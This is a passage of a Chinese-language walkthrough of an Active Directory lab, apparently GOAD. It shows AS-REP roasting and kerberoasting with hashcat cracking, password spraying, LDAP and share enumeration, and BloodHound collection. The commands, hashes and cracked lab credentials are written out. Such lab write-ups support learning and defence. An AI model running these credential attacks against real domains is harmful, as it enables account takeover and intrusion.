    [-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    $krb5asrep$23$PI:EMAIL:6c40c1569d7d9bda2eeebca93e7c3b4d$ee84863d7ed647f92f68bc6888d202f86e06bedd84ee0eaa96c9a01e32cc99a01e2da9786775cf4c815ff5fa89e0d9ef7251d4ccf6765824cef1c7f21cd127c4a0c0a526c9adb4909b2d747c788bbfb30aad9d2f40fd8bef7a9906be11c095532bcb4856fd64c7955e82949dda366a70febbd7ce8b45bd809c40caeb02e3e9bede478361705bdac54ba59e3abec5a2b619ece365987504b1fc2ec82276ae3b197dc688e09944ace8743dd975868ff5f338cc9bb385c1ef5d263c4e93854140e22aec344e09d25127b95fd123c7e788a34438082ceea6190923bd02e3a263287ed082e0df732f3644e84497ee3d5ff6a3d97567f9f437621be5756154c76f38e45f6c220d1f1a
    [-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
    [-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
    [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
我们得到了brandon.stark 的ticket，我们将尝试使用hashcat破解它
    ./hashcat.bin -m18200 '$krb5asrep$23$PI:EMAIL:6c40c1569d7d9bda2eeebca93e7c3b4d$ee84863d7ed647f92f68bc6888d202f86e06bedd84ee0eaa96c9a01e32cc99a01e2da9786775cf4c815ff5fa89e0d9ef7251d4ccf6765824cef1c7f21cd127c4a0c0a526c9adb4909b2d747c788bbfb30aad9d2f40fd8bef7a9906be11c095532bcb4856fd64c7955e82949dda366a70febbd7ce8b45bd809c40caeb02e3e9bede478361705bdac54ba59e3abec5a2b619ece365987504b1fc2ec82276ae3b197dc688e09944ace8743dd975868ff5f338cc9bb385c1ef5d263c4e93854140e22aec344e09d25127b95fd123c7e788a34438082ceea6190923bd02e3a263287ed082e0df732f3644e84497ee3d5ff6a3d97567f9f437621be5756154c76f38e45f6c220d1f1a' ../../rockyou.txt --force
现在一共有两个north.sevenkingdoms.local域的用户名和密码了：
  * samwell.tarly:Heartsbane （前边枚举出的 在用户描述里写了密码）
  * brandon.stark:iseedeadpeople （通过AS-REP Roasting得到的）
### CVE-2022-33679
这里也试一下这个CVE  不过没成功
### Password Spray密码喷洒
首先尝试最典型的密码和用户名相同的
    cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
因为我是用docker开的cme 这里无法识别成字典 而是字符串
进入docker内运行
找到了有效的用户名和密码hodor
可见错误次数也记录了
或者使用sprayhound
    python sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
我们可以用有效用户尝试 sprayhound 以避免锁定帐户（选项 -t 设置剩余尝试次数）
    sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
查看下锁定次数
现在得到了三个north域的有效的用户凭证
  * samwell.tarly:Heartsbane （前边枚举出的 在用户描述里写了密码）
  * brandon.stark:iseedeadpeople （通过AS-REP Roasting得到的）
  * hodor:hodor (密码喷洒)
# 0x03 Enumeration with user 使用用户权限来枚举
现在有了几个账号了 需要进一步扩大权限
## 列出用户
  * 当您在活动目录上获得一个帐户时，要做的第一件事是 **获得完整的用户列表** 。
  * 一旦你得到它，你就可以在完整的用户列表上进行密码喷洒（你经常会发现其他帐户的密码很弱，比如 username=password、SeasonYear!、SocietynameYear! 甚至 123456）。
    GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
    or
    cme smb -u brandon.stark -p iseedeadpeople -d north.sevenkingdoms.local 192.168.56.11 --users
    python impacket-0.10.0/examples/GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    [*] Querying north.sevenkingdoms.local for information about domain.
    Name                  Email                           PasswordLastSet      LastLogon
    --------------------  ------------------------------  -------------------  -------------------    Administrator                                         2022-11-29 23:16:56.991203  2022-12-08 23:33:32.526270
    Guest                                                               
    vagrant                                               2021-05-12 19:38:55.922520  2022-12-08 23:38:09.486896
    krbtgt                                                2022-11-29 23:40:54.384925  
                                                          2023-01-03 11:09:02.127401  
    arya.stark                                            2022-12-08 23:22:05.153754  2022-12-09 21:36:53.270991
    eddard.stark                                          2022-12-08 23:22:09.207041  2023-01-03 21:08:02.475006
    catelyn.stark                                         2022-12-08 23:22:12.386559  
    robb.stark                                            2022-12-08 23:22:15.393750  2023-01-03 21:10:20.175615
    sansa.stark                                           2022-12-08 23:22:18.356514  
    brandon.stark                                         2022-12-08 23:22:21.241552  2023-01-03 16:12:48.097167
    rickon.stark                                          2022-12-08 23:22:24.226727  
    hodor                                                 2022-12-08 23:22:27.323817  
    jon.snow                                              2022-12-08 23:22:30.400802  
    samwell.tarly                                         2022-12-08 23:22:33.502194  
    jeor.mormont                                          2022-12-08 23:22:36.452247  
    sql_svc                                               2022-12-08 23:22:39.401813  2023-01-03 11:03:34.362067
    cme smb -u brandon.stark -p iseedeadpeople -d north.sevenkingdoms.local 192.168.56.11 --users
    SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
    SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
    SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        badpwdcount: 3 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   badpwdcount: 3 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  badpwdcount: 3 baddpwdtime: 2023-01-03 08:12:22.488289+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       badpwdcount: 3 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          badpwdcount: 1 baddpwdtime: 2023-01-03 08:01:00.519880+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  badpwdcount: 0 baddpwdtime: 2023-01-03 08:12:22.488289+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\robb.stark                     badpwdcount: 0 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\catelyn.stark                  badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.488289+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\eddard.stark                   badpwdcount: 0 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\krbtgt                         badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.456059+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\vagrant                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.456059+00:00
    SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Administrator                  badpwdcount: 2 baddpwdtime: 2023-01-03 08:12:22.471684+00:00
或者使用ldap search
[Useful LDAP queries for Windows Active Directory
pentesting](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
    sudo apt install ldap-utils
    ldapsearch -H ldap://192.168.56.11 -D "PI:EMAIL" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
而且由于域信任的关系 我们可以使用ldap查询 **其他域** 内的用户
    ldapsearch -H ldap://192.168.56.12 -D "PI:EMAIL" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
    ldapsearch -H ldap://192.168.56.10 -D "PI:EMAIL" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"
## keberoasting
> kerberoasting的知识：
>  
>  
>     通过SPN发现服务（比如MSSQL）
>
> 具有域内普通用户权限
>
> 向SPN服务进行交互
> 请求Kerberos票据（当用户的TGT被验证为有效时，TGS会向用户发送一张票据，该票据使用与SPN关联服务的计算机服务账号相同的NTLM
> Hash，比如MSSQL账户的Hash）
>
> 根据字典爆破生成Hash 去尝试打开该Kerberos票据
>
> 如果成功 则获得了MSSQL服务账户的密码
>
> 攻击者可以伪造TGS白银票据 在TGS中标识访问账号为域管理员账号 从而获取服务的域管理员访问权限
>
> 或者用于委派攻击(服务账号大多都会被设置委派，如果是非约束委派，则获取服务账号的口令后，可直接获取域管理员权限)
在活动目录中，我们经常会看到设置了 SPN 的用户。
    GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
也可以通过cme来实现
    cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
然后对hash进行爆破
    hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
这样又得到了一个用户：
  * north.sevenkingdoms.local/jon.snow:iknownothing
（不应该是服务账户吗？为什么得到的是jon.snow的）
目前一共有四个账户了：
  * north.sevenkingdoms.local/samwell.tarly:Heartsbane （前边枚举出的 在用户描述里写了密码）
  * north.sevenkingdoms.local/brandon.stark:iseedeadpeople （通过AS-REP Roasting得到的）
  * north.sevenkingdoms.local/hodor:hodor (密码喷洒)
  * north.sevenkingdoms.local/jon.snow:iknownothing（kerberoasting）
## share enum
我们有一个域用户，所以我们可以继续使用用户帐户枚举共享
    cme smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
现在一个新的共享文件夹是可读的（在该靶场里什么都没有，但在真正的渗透中可能会经常得到有趣的信息）
## DNS dump
导出机器的dns解析记录 可能跟我们渗透中常用的arp -a查看arp缓存等目的相似？
    adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
## Bloodhound
  * Boodhound 是活动目录渗透测试的最佳工具之一。 此工具将帮助您找到破解 AD 的所有路径，是您武器库中的必备工具！
  * 要启动 bloodhound，您首先需要从不同的域中检索所有数据。
在这里由于是linux环境，使用python版本的工具来导出域中的数据
windows下的话可以使用
### BloodHound[.]py(linux)
    python bloodhound.py --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local
    python bloodhound.py --zip -c All -d sevenkingdoms.local -u PI:EMAIL -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
    python bloodhound.py --zip -c All -d essos.local -u PI:EMAIL -p iseedeadpeople -dc meereen.essos.local
但是python内的dns解析不到我们在/etc/hosts设定的ip地址 会报类似的错误
我的做法是魔改代码手动指定ip地址
我们现在得到了 3 个域的信息，保存在了zip包里
但是 python 提取并不如windows项目提取的信息那么完整：“支持大部分，但不是所有的 BloodHound (SharpHound)
功能（主要是缺少基于 GPO 的方法）”
然后进行信息可视化
前边的BloodHound.py(linux)和SharpHound(win)是用于提取信息的，这个BloodHound是检索和可视化信息的
首先启动neo4j数据库 然后启动Bloodhound 将zip导入 然后可视化查询
[世界领先的图数据库Neo4j现提供永久免费云服务](https://cloud.tencent.com/developer/article/2091902)
刚开始懒得搭建了 尝试了在线的 没连上
后来根据官方教程本地搭建neo4j
[macOS - BloodHound 4.2.0
documentation](https://bloodhound.readthedocs.io/en/latest/installation/osx.html)
成功连上
导入三个zip包
软件不会用 网页上查一下
单个节点都能查到 但是组合起来查不到WP中的效果 估计是bloodhound-python版本导出数据不全(或者我靶场环境)的原因
下边的图参考wp
  * 显示所有的域和主机
    MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
  * 显示所有用户
    MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
  * domain/group/user之间的映射
    MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q